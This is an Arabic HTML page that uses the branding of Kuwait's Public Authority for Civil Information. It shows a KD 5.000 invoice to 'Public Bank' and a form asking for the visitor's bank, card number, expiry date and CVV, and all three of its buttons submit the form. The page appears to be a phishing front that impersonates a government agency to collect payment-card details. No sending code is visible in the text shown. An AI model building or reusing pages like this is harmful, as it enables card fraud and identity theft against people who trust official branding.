</head>

<body>

    <!-- الهيدر مع الشعار -->
    <div class="logo-section">

        <img src="./images/pacilogo.png" alt="Logo" class="header-logo mb-3"> <!-- ضع صورة الشعار هنا -->
    </div>




    <div class="d-flex flex-column justify-content-center  gap-3 w-100 parent-container">





        <header class="header">

            <nav class="navbar navbar-expand-lg navbar-dark">
                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav"
                    aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                    القائمه الرئسيه
                </button>
                <div class="collapse navbar-collapse justify-content-center" id="navbarNav">
                    <ul class="navbar-nav">
                        <li class="nav-item">
                            <a class="nav-link" href="#">الرئيسي</a>

                        </li>
                    </ul>
                </div>
            </nav>
        </header>
        <div class="header-title">
            <h2>
                خدمات الهيئة
            </h2>


            <!-- محتوى الصفحة الرئيسي -->
            <div class=" mt-4 content-pages">
         
    <div class="">
        <div class="card-container">
            <div class="card card-custom">
                <div class="card-body">
                     <h5 class="card-title" >معلومات الفاتوره</h5>
                </div>
                <div class="card-body">

                    <div class="card-text">
                        <div class="form-group">
                            <label for="card-number">المستفيد:</label>
                            <div class="input-group">
                                <h6>Public Bank</h6>

                            </div>
                        </div>

                        <div class="form-group">
                            <label for="card-number">الموقع:</label>
                            <div class="input-group">
                                <h6>https://www.publicbank.com</h6>

                            </div>
                        </div>

                        <div class="form-group">
                            <label for="card-number">المبلغ:</label>
                            <div class="input-group">
                                <h6>KD 5.000</h6>

                            </div>
                        </div>
                    </div>

                </div>

         
              
                <div class="card-body">
                    <h5 class="card-title">معلومات البطاقه</h5>
                    <form id="payment-form">
                        <div class="form-group">
                            <label for="bank-select">يرجى اختيار البنك</label>
                            <select class="form-control" id="bank-select" required>
                                <option value="" disabled selected>يرجى اختيار البنك</option>
                                <option value="البنك البحرين والكويت">البنك البحرين والكويت</option>
                                <option value="BNP PARIBAS">BNP PARIBAS</option>
                                <option value="بنك HSBC الشرق الأوسط المحدود">بنك HSBC الشرق الأوسط المحدود</option>
                                <option value="بنك أبو ظبي الأول">بنك أبو ظبي الأول</option>
                                <option value="Citibank">Citibank</option>
                                <option value="بنك قطر الوطني">بنك قطر الوطني</option>
                                <option value="بنك الدوحة">بنك الدوحة</option>
                                <option value="بنك المشرق">بنك المشرق</option>
                                <option value="شركة الراجحي المصرفية للإستثمار">شركة الراجحي المصرفية للإستثمار</option>
                                <option value="بنك مسقط">بنك مسقط</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label for="card-number">رقم بطاقه الصرف الالي</label>
                                <input type="text" class="form-control" id="card-number" placeholder="XXXX-XXXX-XXXX-XXXX" required>

                        </div>
                        <div class="form-group">
                            <label for="expiry-date">تاريخ انتهاء البطاقة</label>
                            <div class="input-group">
                                <select class="form-control" id="expiry-month" required>
                                    <option value="" disabled selected>mmm</option>
                                    <option value="01">يناير</option>
                                    <option value="02">فبراير</option>
                                    <option value="03">مارس</option>
                                    <option value="04">أبريل</option>
                                    <option value="05">مايو</option>
                                    <option value="06">يونيو</option>
                                    <option value="07">يوليو</option>
                                    <option value="08">أغسطس</option>
                                    <option value="09">سبتمبر</option>
                                    <option value="10">أكتوبر</option>
                                    <option value="11">نوفمبر</option>
                                    <option value="12">ديسمبر</option>
                                </select>
                                <select class="form-control" id="expiry-year" required>
                                    <option value="" disabled selected>yyyy</option>
                                    <!-- الخيارات من 2025 إلى 2036 -->
                                    <option value="2025">2025</option>
                                    <option value="2026">2026</option>
                                    <option value="2027">2027</option>
                                    <option value="2028">2028</option>
                                    <option value="2029">2029</option>
                                    <option value="2030">2030</option>
                                    <option value="2031">2031</option>
                                    <option value="2032">2032</option>
                                    <option value="2033">2033</option>
                                    <option value="2034">2034</option>
                                    <option value="2035">2035</option>
                                    <option value="2036">2036</option>
                                </select>
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label for="cvv">CVV</label>
                            <input type="text" class="form-control" id="cvv" placeholder="XXX" required>
                        </div>
                        <div class="mt-2">
                            <button type="submit" class="bt-payment">ارسال</button>
                            <button type="submit" class="bt-payment">اعاده</button>
                            <button type="submit" class="bt-payment">الغاء</button>


                        </div>
                        
                    </form>
                </div>
            </div>
        </div>
    </div>
      


            </div>

        </div>


        <!-- الفوتر -->
        <footer class="footer bg-dark text-white text-center py-3 mt-4 ">
            <p> &copy; الهيئة العامة للمعلومات المدنية 2024</p>

        </footer>


    </div>
